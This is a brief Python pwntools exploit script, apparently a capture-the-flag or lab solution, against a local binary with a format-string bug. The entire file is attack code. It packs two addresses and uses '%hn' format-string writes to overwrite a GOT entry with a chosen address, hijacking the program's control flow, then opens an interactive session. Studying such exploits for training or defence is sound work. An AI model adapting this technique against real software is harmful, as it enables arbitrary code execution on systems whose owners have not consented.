from pwn import *
#context.log_level = 'debug'
p = process("./Formatstring-write-got-without-leak")

# write 0x0804849b to 0x804a018

payload = p32(0x804a020)
payload += p32(0x804a018)
payload += "%{}c%4$hn".format(0x0804 -8).encode()
payload += "%{}c%5$hn".format(0x849b - 0x0804).encode()


p.send(payload)
# p.recvuntil(b'end')
p.interactive()




